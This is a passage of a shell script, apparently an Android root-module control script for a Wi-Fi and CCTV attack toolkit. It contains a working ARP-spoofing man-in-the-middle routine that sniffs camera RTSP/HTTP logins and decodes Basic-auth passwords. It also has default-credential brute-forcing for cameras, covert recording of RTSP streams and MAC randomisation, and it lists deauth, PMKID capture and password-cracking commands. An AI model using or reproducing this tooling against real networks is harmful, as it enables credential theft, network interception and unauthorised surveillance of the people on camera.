  cctvpaths) [ -n "$2" ] && "$CSC" paths "$2" 2>&1 || echo "usage: cctvpaths ip[:port]" ;;
  cctvbrand) [ -n "$2" ] && "$CSC" brand "$2" 2>&1 || echo "usage: cctvbrand ip" ;;
  cctvonvif) "$CSC" onvif 2>&1 ;;
  cctvcreds) [ -n "$2" ] && "$CSC" creds "$2" "$3" 2>&1 || echo "usage: cctvcreds ip[:port] [wordlist]" ;;
  # sniff RTSP/HTTP logins off the wire via ARP-spoof MITM (your own LAN)
  credsniff)
    cam="$2"; [ -n "$cam" ] || { echo "usage: credsniff <camera-ip> [seconds]"; exit 0; }
    sec="${3:-60}"
    # Android uses per-iface routing tables — pick the private-LAN iface + its gateway
    iface=$(ip -o -4 addr show 2>/dev/null | awk '$4 ~ /^(192\.168|10\.|172\.(1[6-9]|2[0-9]|3[01]))\./{print $2; exit}'); iface="${iface:-wlan0}"
    gw=$(ip route show table "$iface" 2>/dev/null | awk '/default/{print $3; exit}')
    [ -n "$gw" ] || gw=$(ip route get 1.1.1.1 2>/dev/null | sed -n 's/.*via \([0-9.][0-9.]*\).*/\1/p')
    [ -n "$gw" ] || { echo "no LAN gateway found (connect Wi-Fi)"; exit 0; }
    sh "$0" credsniffstop >/dev/null 2>&1
    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    ( NHIF="$iface" "$CSC" arpspoof "$cam" "$gw" >/dev/null 2>&1 ) & echo $! > "$MODDIR/.arp.pid"
    mkdir -p "$CAPDIR"; f="$CAPDIR/creds_$(date +%Y%m%d_%H%M%S).txt"; echo "$f" > "$MODDIR/.sniff.file"
    ( timeout "$sec" "$TCPDUMP" -i "$iface" -l -A -s0 "host $cam and (tcp port 554 or tcp port 80 or tcp port 8000)" 2>/dev/null \
        | grep -iaE "Authorization:|DESCRIBE rtsp|GET /" > "$f"; sh "$0" credsniffstop >/dev/null 2>&1 ) & echo $! > "$MODDIR/.sniff.pid"
    echo "MITM $cam <-> $gw on $iface (${sec}s) — now open the camera in your NVR/app so it authenticates" ;;
  credsniffstop)
    [ -f "$MODDIR/.arp.pid" ] && kill "$(cat "$MODDIR/.arp.pid")" 2>/dev/null; rm -f "$MODDIR/.arp.pid"
    [ -f "$MODDIR/.sniff.pid" ] && kill "$(cat "$MODDIR/.sniff.pid")" 2>/dev/null; rm -f "$MODDIR/.sniff.pid"
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null; echo "sniff stopped" ;;
  credsniffresult)
    f=$(cat "$MODDIR/.sniff.file" 2>/dev/null); [ -f "$f" ] || { echo "(no capture)"; exit 0; }
    grep -iaE "Authorization: Basic" "$f" | sed 's/.*[Bb]asic //' | sort -u | while read -r b; do
      d=$(echo "$b" | base64 -d 2>/dev/null); [ -n "$d" ] && echo "LOGIN (Basic): $d"; done
    grep -iaqE "Authorization: Digest" "$f" && echo "(Digest auth seen — not reversible; use 'cctvcreds' default-list or crack offline)"
    [ -s "$f" ] || echo "(nothing yet — traffic must flow; trigger the camera in your NVR/app while sniffing)" ;;
  cctvopen)  # hand the RTSP URL to a video player (VLC/MX) for live view — no chroot
    [ -n "$2" ] || { echo "usage: cctvopen rtsp://…"; exit 0; }
    am start -a android.intent.action.VIEW -d "$2" -t "video/*" >/dev/null 2>&1 \
      && echo "opening in player…" || { am start -a android.intent.action.VIEW -d "$2" >/dev/null 2>&1 && echo "opening…" || echo "no RTSP player installed (get VLC)"; } ;;
  cctvsnap)  # one JPEG frame via bundled ffmpeg (no chroot; works local + remote)
    url="$2"; [ -n "$url" ] || { echo "ERR:usage cctvsnap rtsp://…"; exit 0; }
    out="$MODDIR/.rtsp.jpg"; rm -f "$out"
    "$FFM" -y -rtsp_transport tcp -timeout 8000000 -i "$url" -frames:v 1 -q:v 3 "$out" >/dev/null 2>"$MODDIR/.rtsp.err"
    if [ -s "$out" ]; then base64 "$out" 2>/dev/null | tr -d '\n'
    else
      e=$(grep -ioE '401 Unauthorized|Connection refused|timed out|404 Not Found|Invalid data|No route|Protocol not' "$MODDIR/.rtsp.err" 2>/dev/null | tail -1)
      case "$e" in
        *Invalid*)  m="not an RTSP stream — that host/port is a web server, not a camera (RTSP is :554; use 'try 554')";;
        *refused*)  m="connection refused — no RTSP on that port (try :554, or the camera is off)";;
        *401*)      m="password required — add credentials: rtsp://USER:PASS@host:554/path";;
        *404*)      m="wrong path — hit 'try 554' to discover the correct stream path";;
        *timed*|*route*) m="unreachable — camera off or not on this network";;
        *)          m="no frame — check the URL, credentials, and that it's a :554 RTSP camera";;
      esac
      echo "ERR:$m"; fi ;;
  cctvrec)   # record N seconds of RTSP → mp4 (video-only stream copy, low CPU)
    url="$2"; sec="${3:-30}"; [ -n "$url" ] || { echo "usage: cctvrec url seconds"; exit 0; }
    mkdir -p "$CAPDIR"; f="$CAPDIR/rtsp_$(date +%Y%m%d_%H%M%S).mp4"
    sh "$0" cctvrecstop >/dev/null 2>&1
    ( "$FFM" -y -rtsp_transport tcp -timeout 8000000 -i "$url" -t "$sec" -an -c:v copy -movflags +faststart "$f" >/dev/null 2>&1 ) &
    echo $! > "$MODDIR/.rtsprec.pid"; echo "$f" > "$MODDIR/.rtsprec.file"
    echo "recording ${sec}s → $(basename "$f")" ;;
  cctvrecstop) [ -f "$MODDIR/.rtsprec.pid" ] && kill "$(cat "$MODDIR/.rtsprec.pid")" 2>/dev/null; rm -f "$MODDIR/.rtsprec.pid"
    [ -f "$MODDIR/.rtsprec.file" ] && echo "saved $(basename "$(cat "$MODDIR/.rtsprec.file")")" || echo "not recording" ;;
  cctvrecs)  ls -1t "$CAPDIR"/rtsp_*.mp4 2>/dev/null | while read -r x; do basename "$x"; done | head -10; [ -n "$(ls "$CAPDIR"/rtsp_*.mp4 2>/dev/null)" ] || echo "(none)" ;;
  cctvsave)  # cctvsave <name> <rtsp url>
    [ -n "$2" ] && [ -n "$3" ] || { echo "usage: cctvsave name url"; exit 0; }
    touch "$CAMCONF"; grep -v "^$2	" "$CAMCONF" > "$CAMCONF.t" 2>/dev/null; mv "$CAMCONF.t" "$CAMCONF" 2>/dev/null
    printf '%s\t%s\n' "$2" "$3" >> "$CAMCONF"; chmod 600 "$CAMCONF"; echo "saved $2" ;;
  cctvlist)  [ -f "$CAMCONF" ] && cat "$CAMCONF" || echo "" ;;
  cctvdel)   [ -n "$2" ] || { echo "usage: cctvdel name"; exit 0; }
    grep -v "^$2	" "$CAMCONF" > "$CAMCONF.t" 2>/dev/null; mv "$CAMCONF.t" "$CAMCONF" 2>/dev/null; echo "deleted $2" ;;
  status)
    printf '{"iw":%s,"ext":"%s","autoload":%s,"detected":[' "$(_has_iw)" "$(_extiface)" \
      "$([ -f "$MODDIR/auto_load" ] && echo true || echo false)"
    f=1; _detect | while IFS='	' read -r vp drv name; do [ $f -eq 1 ] || printf ','; f=0
      printf '{"vp":"%s","driver":"%s","name":"%s"}' "$vp" "$drv" "$name"; done
    printf '],"drivers":['
    f=1; for d in $(_drivers); do [ $f -eq 1 ] || printf ','; f=0
      printf '{"name":"%s","loaded":%s}' "$d" "$(_loaded "$d" && echo true || echo false)"; done
    printf '],"ifaces":['
    f=1; for i in $(_ifaces); do [ $f -eq 1 ] || printf ','; f=0
      printf '{"name":"%s","driver":"%s","mode":"%s","mac":"%s","up":%s,"usb":"%s"}' \
        "$i" "$(_drv_of "$i")" "$(_mode_of "$i")" "$(_mac_of "$i")" \
        "$(cat /sys/class/net/$i/operstate 2>/dev/null | grep -q up && echo true || echo false)" \
        "$(_usbinfo "$i")"; done
    printf ']}' ;;
  load)   t=$2; if [ "$t" = all ]; then _load_retry $(_drivers); else _load_retry $(_family "$t"); fi; echo OK ;;
  unload) t=$2; ch=1
    while [ "$ch" = 1 ]; do ch=0   # retry: leaf modules first, then bases as their refcount hits 0
      for d in $(_drivers); do { [ "$t" = all ] || [ "$t" = "$d" ]; } || continue
        _loaded "$d" || continue
        rmmod "$(echo "$d" | tr - _)" 2>/dev/null && ch=1
      done
    done; echo OK ;;
  reload) sh "$0" unload all >/dev/null 2>&1; sleep 1; sh "$0" load all ;;
  monitor)
    i=$2; s=$3; ip link set "$i" down 2>&1
    if [ "$s" = on ]; then "$IW" dev "$i" set type monitor 2>&1 || airmon-ng start "$i" 2>&1
    else "$IW" dev "$i" set type managed 2>&1; fi
    ip link set "$i" up 2>&1; echo "mode=$(_mode_of "$i")" ;;
  channel) "$IW" dev "$2" set channel "$3" 2>&1 && echo "channel $3 set" ;;
  mac)
    i=$2; m=$3
    [ "$m" = random ] && m=$(printf '02:%02x:%02x:%02x:%02x:%02x' \
      $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
    ip link set "$i" down 2>&1; ip link set "$i" address "$m" 2>&1; ip link set "$i" up 2>&1
    echo "mac=$(_mac_of "$i")" ;;
  txpower) _set_txpower "$2" "$3" ;;
  region)  "$IW" reg set "$2" 2>&1 && echo "region $2" ;;
  autoload) [ "$2" = on ] && touch "$MODDIR/auto_load" || rm -f "$MODDIR/auto_load"; echo "autoload $2" ;;
  dmesg)   dmesg 2>/dev/null | grep -iE "rtl|88[0-9]2|ath9k|mt76|rtw|cfg80211|ieee80211|wlan|usb .*net" | tail -40 ;;
  iwver)   "$IW" --version 2>&1 ;;
  *) echo "usage: status|detect|loadmatch|find|startmon|stopmon|scan|hop|hopstop|load|unload|reload|monitor|channel|mac|txpower|txpreset|region|powersave|profile|aprofile|usbinfo|link|verify|diag|autoload|dmesg|iwver  attack: deauth|deauthstop|capture|capturestop|captures|pmkid|pmkidstop|hashes|crack|crackstatus|wordlists|getwordlist|savedpw  cam: camlist|caminfo|camsnap|camsave|camrec  cctv: cctvscan|cctvpaths|cctvbrand|cctvonvif|cctvcreds|cctvsnap|cctvrec|cctvsave|cctvlist|cctvdel" ;;
esac
